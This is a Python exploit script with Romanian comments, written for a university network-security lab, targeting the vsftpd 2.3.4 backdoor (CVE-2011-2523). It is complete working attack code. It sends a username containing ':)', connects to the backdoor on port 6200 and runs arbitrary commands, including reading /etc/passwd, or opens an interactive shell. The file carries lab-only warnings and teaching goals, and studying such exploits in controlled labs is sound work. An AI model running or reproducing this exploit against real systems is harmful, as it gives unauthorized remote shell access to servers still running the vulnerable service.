#!/usr/bin/env python3
"""
================================================================================
Exploit: vsftpd 2.3.4 Backdoor (CVE-2011-2523)
================================================================================
S13 - IoT și Securitate în Rețele de Calculatoare

OBIECTIVE PEDAGOGICE:
1. Înțelegerea anatomiei unui exploit real
2. Lucrul cu socketuri pentru comunicare de nivel scăzut
3. Automatizarea procesului de exploatare
4. Conștientizarea pericolului serviciilor vulnerabile

CONTEXT ISTORIC:
- Versiunea vsftpd 2.3.4 a fost publicată în iulie 2011 cu un backdoor
- Backdoor-ul a fost introdus de un atacator care a compromis serverul de build
- Un username care conține caracterele ":)" deschide un shell pe portul 6200
- Vulnerabilitatea a fost descoperită rapid și versiunea a fost retrasă

FLUX EXPLOIT:
1. Conectare la serviciul FTP (port 21/2121)
2. Trimitere USER cu sufixul ":)"
3. Trimitere PASS (orice valoare)
4. Conectare la portul backdoor (6200)
5. Execuție comenzi în shell-ul obținut

UTILIZARE:
    python3 ftp_backdoor_vsftpd.py --target 10.0.13.12 --ftp-port 2121
    python3 ftp_backdoor_vsftpd.py --target 10.0.13.12 --command "id; whoami; cat /etc/passwd"

ATENȚIE ETICĂ:
    Acest script este EXCLUSIV pentru mediu de laborator controlat!
================================================================================
"""

from __future__ import annotations

import argparse
import socket
import sys
import time
from typing import Optional, Tuple

# ==============================================================================
# CONSTANTE
# ==============================================================================

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    RESET = "\033[0m"
    BOLD = "\033[1m"


# Configurări implicite
DEFAULT_FTP_PORT = 2121
DEFAULT_BACKDOOR_PORT = 6200
DEFAULT_TIMEOUT = 5.0
BACKDOOR_TRIGGER = ":)"  # Caracterele care activează backdoor-ul


# ==============================================================================
# FUNCȚII EXPLOIT
# ==============================================================================

def check_vsftpd_version(host: str, port: int, timeout: float) -> Tuple[bool, str]:
    """
    Verifică dacă serviciul FTP este vsftpd 2.3.4.
    
    Returns:
        Tuple (is_vulnerable, banner_string)
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # Citim bannerul FTP
        banner = sock.recv(1024).decode("utf-8", errors="replace").strip()
        sock.close()
        
        # Verificăm versiunea
        is_vulnerable = "2.3.4" in banner.lower()
        return is_vulnerable, banner
    
    except Exception as e:
        return False, f"Error: {e}"


def trigger_backdoor(
    host: str,
    port: int,
    timeout: float,
    verbose: bool = True
) -> bool:
    """
    Activează backdoor-ul prin trimiterea username-ului special.
    
    EXPLICAȚIE TEHNICĂ:
    - Serverul vsftpd 2.3.4 verifică username-ul pentru caracterele ":)"
    - Dacă sunt găsite, pornește un listener pe portul 6200
    - Acest comportament a fost introdus malițios în codul sursă
    
    Returns:
        True dacă backdoor-ul a fost activat cu succes
    """
    if verbose:
        print(f"\n{Colors.BLUE}[*] Etapa 1: Conectare la FTP ({host}:{port}){Colors.RESET}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # ========================================
        # SECȚIUNEA STUDENT - Trigger backdoor
        # ========================================
        
        # Citim bannerul FTP
        banner = sock.recv(1024).decode("utf-8", errors="replace").strip()
        if verbose:
            print(f"    {Colors.GREEN}Banner: {banner}{Colors.RESET}")
        
        # Trimitem USER cu trigger-ul backdoor
        # Username-ul trebuie să conțină ":)" pentru a activa backdoor-ul
        payload_user = f"USER exploit{BACKDOOR_TRIGGER}\r\n"
        if verbose:
            print(f"\n{Colors.BLUE}[*] Etapa 2: Trimitere username malițios{Colors.RESET}")
            print(f"    Payload: USER exploit{Colors.YELLOW}{BACKDOOR_TRIGGER}{Colors.RESET}")
        
        sock.sendall(payload_user.encode())
        time.sleep(0.2)
        
        # Citim răspunsul (331 Please specify password)
        response = sock.recv(1024).decode("utf-8", errors="replace").strip()
        if verbose:
            print(f"    Răspuns: {response}")
        
        # Trimitem PASS (valoarea nu contează)
        payload_pass = "PASS anything\r\n"
        if verbose:
            print(f"\n{Colors.BLUE}[*] Etapa 3: Trimitere parolă{Colors.RESET}")
            print(f"    Payload: PASS anything")
        
        sock.sendall(payload_pass.encode())
        time.sleep(0.3)
        
        # Nu mai așteptăm răspuns - serverul ar putea să nu răspundă
        # deoarece backdoor-ul modifică flow-ul normal
        
        sock.close()
        
        if verbose:
            print(f"\n    {Colors.GREEN}[✓] Backdoor trigger trimis cu succes{Colors.RESET}")
        
        return True
    
    except socket.timeout:
        if verbose:
            print(f"    {Colors.YELLOW}[!] Timeout - serverul nu a răspuns{Colors.RESET}")
        return False
    
    except ConnectionRefusedError:
        if verbose:
            print(f"    {Colors.RED}[✗] Conexiune refuzată{Colors.RESET}")
        return False
    
    except Exception as e:
        if verbose:
            print(f"    {Colors.RED}[✗] Eroare: {e}{Colors.RESET}")
        return False


def connect_backdoor(
    host: str,
    port: int,
    timeout: float,
    command: Optional[str] = None,
    verbose: bool = True
) -> Optional[str]:
    """
    Se conectează la shell-ul backdoor și execută comenzi.
    
    Args:
        host: Adresa IP țintă
        port: Portul backdoor (default 6200)
        timeout: Timeout conexiune
        command: Comanda de executat (None pentru shell interactiv)
        verbose: Afișează mesaje detaliate
    
    Returns:
        Output-ul comenzii sau None dacă eșuează
    """
    if verbose:
        print(f"\n{Colors.BLUE}[*] Etapa 4: Conectare la backdoor ({host}:{port}){Colors.RESET}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        if verbose:
            print(f"    {Colors.GREEN}[✓] Conectat la backdoor shell!{Colors.RESET}")
        
        if command:
            # ========================================
            # SECȚIUNEA STUDENT - Execuție comandă
            # ========================================
            
            # Executăm comanda furnizată
            if verbose:
                print(f"\n{Colors.BLUE}[*] Etapa 5: Execuție comandă{Colors.RESET}")
                print(f"    Comandă: {command}")
            
            # Trimitem comanda + newline
            sock.sendall(f"{command}\n".encode())
            time.sleep(0.5)
            
            # Citim output-ul
            output = b""
            sock.settimeout(1.0)  # Timeout mai scurt pentru citire
            
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    output += chunk
                except socket.timeout:
                    break
            
            sock.close()
            
            result = output.decode("utf-8", errors="replace").strip()
            
            if verbose:
                print(f"\n{Colors.CYAN}┌──────────────────────────────────────────┐{Colors.RESET}")
                print(f"{Colors.CYAN}│ OUTPUT BACKDOOR SHELL                    │{Colors.RESET}")
                print(f"{Colors.CYAN}└──────────────────────────────────────────┘{Colors.RESET}")
                for line in result.split("\n"):
                    print(f"  {line}")
            
            return result
        
        else:
            # Mod interactiv (mini-shell)
            if verbose:
                print(f"\n{Colors.YELLOW}[i] Mod shell interactiv (Ctrl+C pentru ieșire){Colors.RESET}")
                print(f"{Colors.CYAN}{'─'*50}{Colors.RESET}")
            
            try:
                while True:
                    cmd = input(f"{Colors.GREEN}backdoor@{host}${Colors.RESET} ")
                    if cmd.lower() in ["exit", "quit"]:
                        break
                    
                    sock.sendall(f"{cmd}\n".encode())
                    time.sleep(0.3)
                    
                    sock.settimeout(1.0)
                    try:
                        response = sock.recv(4096).decode("utf-8", errors="replace")
                        print(response, end="")
                    except socket.timeout:
                        pass
            
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[i] Ieșire shell interactiv{Colors.RESET}")
            
            sock.close()
            return None
    
    except socket.timeout:
        if verbose:
            print(f"    {Colors.RED}[✗] Timeout - backdoor-ul nu răspunde{Colors.RESET}")
            print(f"    {Colors.YELLOW}    Posibil că trigger-ul nu a funcționat{Colors.RESET}")
        return None
    
    except ConnectionRefusedError:
        if verbose:
            print(f"    {Colors.RED}[✗] Conexiune refuzată pe portul {port}{Colors.RESET}")
            print(f"    {Colors.YELLOW}    Backdoor-ul nu este activ sau portul nu e expus{Colors.RESET}")
        return None
    
    except Exception as e:
        if verbose:
            print(f"    {Colors.RED}[✗] Eroare: {e}{Colors.RESET}")
        return None


def run_exploit(
    host: str,
    ftp_port: int = DEFAULT_FTP_PORT,
    backdoor_port: int = DEFAULT_BACKDOOR_PORT,
    command: Optional[str] = None,
    timeout: float = DEFAULT_TIMEOUT,
    verbose: bool = True
) -> bool:
    """
    Rulează exploitul complet.
    
    Returns:
        True dacă exploitul a reușit
    """
    if verbose:
        print(f"\n{Colors.CYAN}{'═'*60}")
        print(f"  EXPLOIT: vsftpd 2.3.4 Backdoor (CVE-2011-2523)")
        print(f"  Țintă: {host}:{ftp_port}")
        print(f"{'═'*60}{Colors.RESET}")
    
    # Pasul 0: Verificăm versiunea
    if verbose:
        print(f"\n{Colors.BLUE}[*] Etapa 0: Verificare versiune vsftpd{Colors.RESET}")
    
    is_vulnerable, banner = check_vsftpd_version(host, ftp_port, timeout)
    
    if verbose:
        if is_vulnerable:
            print(f"    {Colors.GREEN}[✓] Versiune vulnerabilă detectată!{Colors.RESET}")
        else:
            print(f"    {Colors.YELLOW}[!] Versiune necunoscută: {banner}{Colors.RESET}")
            print(f"    {Colors.YELLOW}    Continuăm oricum...{Colors.RESET}")
    
    # Pasul 1-3: Activăm backdoor-ul
    if not trigger_backdoor(host, ftp_port, timeout, verbose):
        return False
    
    # Așteptăm ca backdoor-ul să se activeze
    time.sleep(0.5)
    
    # Pasul 4-5: Ne conectăm la backdoor
    result = connect_backdoor(host, backdoor_port, timeout, command, verbose)
    
    if result is not None or command is None:
        if verbose:
            print(f"\n{Colors.GREEN}{'═'*60}")
            print(f"  [✓] EXPLOIT REUȘIT!")
            print(f"{'═'*60}{Colors.RESET}")
        return True
    
    return False


# ==============================================================================
# MAIN
# ==============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Exploit vsftpd 2.3.4 backdoor pentru laborator S13",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemple:
  %(prog)s --target 10.0.13.12 --ftp-port 2121
  %(prog)s --target 10.0.13.12 --command "id; whoami"
  %(prog)s --target 10.0.13.12 --command "cat /etc/passwd | head -5"
        """
    )
    
    parser.add_argument("--target", required=True,
                        help="Adresa IP țintă")
    parser.add_argument("--ftp-port", type=int, default=DEFAULT_FTP_PORT,
                        help=f"Port FTP (default: {DEFAULT_FTP_PORT})")
    parser.add_argument("--backdoor-port", type=int, default=DEFAULT_BACKDOOR_PORT,
                        help=f"Port backdoor (default: {DEFAULT_BACKDOOR_PORT})")
    parser.add_argument("--command",
                        help="Comandă de executat (implicit: shell interactiv)")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT,
                        help=f"Timeout conexiune (default: {DEFAULT_TIMEOUT}s)")
    parser.add_argument("--quiet", action="store_true",
                        help="Output minimal")
    
    args = parser.parse_args()
    
    # Avertisment etic
    if not args.quiet:
        print(f"\n{Colors.RED}{'!'*60}")
        print(f"  AVERTISMENT: Acest exploit este DOAR pentru laborator!")
        print(f"  Utilizarea pe sisteme fără autorizare este ILEGALĂ!")
        print(f"{'!'*60}{Colors.RESET}")
    
    # Rulăm exploitul
    success = run_exploit(
        host=args.target,
        ftp_port=args.ftp_port,
        backdoor_port=args.backdoor_port,
        command=args.command,
        timeout=args.timeout,
        verbose=not args.quiet
    )
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
